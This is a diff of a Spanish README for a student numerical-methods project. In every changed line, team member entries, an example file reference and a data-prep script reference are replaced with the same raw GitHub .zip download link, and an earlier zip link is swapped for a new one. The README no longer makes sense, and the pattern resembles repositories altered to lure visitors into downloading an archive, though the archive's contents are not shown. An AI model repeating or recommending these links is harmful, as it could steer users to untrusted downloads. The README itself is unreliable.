@@ -2,9 +2,9 @@
 
 ## Integrantes
 
-* F. Galileo Cappella Lewi, 653/20, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/semiconservative/f_metnum_tp2.zip
-* Juan Pablo Anachure, 99/16, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/semiconservative/f_metnum_tp2.zip
-* Octavio La Tessa, 477/16, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/semiconservative/f_metnum_tp2.zip
+* F. Galileo Cappella Lewi, 653/20, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip
+* Juan Pablo Anachure, 99/16, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip
+* Octavio La Tessa, 477/16, https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip
 
 ## Compilar
 
@@ -15,7 +15,7 @@ git submodule update --init
 make
 ~~~
 
-El programa compilado genera un archivo que puede ser importado desde python, en el archivo `https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/semiconservative/f_metnum_tp2.zip` se puede ver un ejemplo de cómo usarlo.
+El programa compilado genera un archivo que puede ser importado desde python, en el archivo `https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip` se puede ver un ejemplo de cómo usarlo.
 
 ## Correr tests
 
@@ -29,7 +29,7 @@ Todos los experimentos tienen como parámetro principal `name`, que es el nombre
 
 ### Preparar datos
 
-El dataset tiene que ser un archivo `csv` con una columna titulada `label` de cualquier tipo enumerable y el resto de columnas que tienen que ser números. Se puede usar el script `https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/semiconservative/f_metnum_tp2.zip` para usar cualquier csv.
+El dataset tiene que ser un archivo `csv` con una columna titulada `label` de cualquier tipo enumerable y el resto de columnas que tienen que ser números. Se puede usar el script `https://raw.githubusercontent.com/janachure/f_metnum_tp2/main/informe/sections/tp-metnum-f-v2.7.zip` para usar cualquier csv.
 
 ### Resultados
 
